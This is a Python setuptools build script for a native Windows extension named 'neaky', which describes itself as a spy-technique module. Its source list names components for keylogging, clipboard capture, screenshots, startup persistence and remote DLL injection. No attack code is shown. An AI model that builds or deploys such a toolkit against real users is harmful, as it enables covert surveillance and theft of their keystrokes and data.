from setuptools import setup, Extension

## TODO dynamically find source files?

module1 = Extension('neaky',
                    sources=['src/neakymodule.c', 'src/spy/clipboard.cpp', 'src/py_functions.cpp', 'src/utils.cpp', 'src/persist/startup.cpp',
                             'src/spy/keylog_hook.cpp', 'src/spy/keylog_rawinput.cpp', 'src/persist/remote_dll_injection.cpp', 'src/spy/screenshot.cpp'],
                    include_dirs=['include'],
                    libraries=["shcore", "kernel32", "user32", "gdi32", "winspool", "comdlg32", "advapi32", "shell32", "ole32", "oleaut32", "uuid", "odbc32", "odbccp32"])


setup(name='neaky',
      version='0.0.1',
      description='A python native module for some spy technique on Microsoft Windows.',
      ext_modules=[module1])
